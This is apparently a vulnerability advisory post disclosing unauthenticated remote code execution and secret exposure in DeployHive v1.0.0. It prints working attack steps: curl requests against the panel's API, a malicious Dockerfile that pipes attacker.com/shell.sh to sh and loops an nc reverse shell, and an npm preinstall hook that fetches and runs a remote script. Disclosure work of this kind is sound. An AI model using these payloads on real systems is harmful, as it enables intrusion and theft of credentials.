---
title: "DeployHive v1.0.0 — Unauthenticated RCE via Docker Build and npm Lifecycle Scripts"
date: 2026-05-27 16:00:00 +0000
categories: [CVE, RCE]
tags: [deployhive, docker, npm, rce, unauthenticated, supply-chain]
---

## Overview

**Affected software:** iabdullahmumtaz/DeployHive v1.0.0  
**CVSS 3.1 (worst):** 10.0 Critical  
**Reported:** 2026-05-27 (GitHub issue #1)

DeployHive is a DevOps deployment panel — deploy Git repos, manage env vars, Docker builds, live logs. Zero authentication on any endpoint. Two independent RCE vectors.

## Attack Chain — Docker RCE

**Step 1:** Create a project pointing to attacker-controlled repo (no auth needed):

```bash
curl -X POST http://victim:6012/api/projects \
  -H 'Content-Type: application/json' \
  -d '{"name":"x","repoUrl":"https://github.com/attacker/malicious","branch":"main"}'
```

**Step 2:** Trigger deployment:

```bash
curl -X POST http://victim:6012/api/deployments \
  -H 'Content-Type: application/json' \
  -d '{"projectId":"<id>"}'
```

DeployHive clones the repo, finds the `Dockerfile`, runs `docker build` + `docker run` with `RestartPolicy: unless-stopped`. The container runs on every reboot.

**Malicious Dockerfile:**
```dockerfile
FROM alpine
RUN curl http://attacker.com/shell.sh | sh
CMD ["sh","-c","while true; do nc attacker.com 4444 -e /bin/sh; sleep 5; done"]
```

## Attack Chain — npm RCE (no Docker needed)

If the repo has `package.json` but no `Dockerfile`, DeployHive runs:

```typescript
execSync('npm install --omit=dev', { cwd: repoPath });
// ↑ executes preinstall/postinstall hooks on the HOST
```

**Malicious `package.json`:**
```json
{
  "name": "legit",
  "scripts": {
    "preinstall": "curl http://attacker.com/shell.sh | bash"
  }
}
```

No Docker required. The OS command runs as the DeployHive process user.

## FINDING-04 — Secrets Exposure

```bash
curl http://victim:6012/api/projects
# → All project configs including envVars with API keys, DB credentials, secrets
```

## PoC Code

[github.com/BlessedOn3/poc-deployhive-unauth-rce](https://github.com/BlessedOn3/poc-deployhive-unauth-rce)

## Timeline

| Date | Event |
|------|-------|
| 2026-05-27 | Vulnerabilities discovered |
| 2026-05-27 | GitHub issue #1 opened |
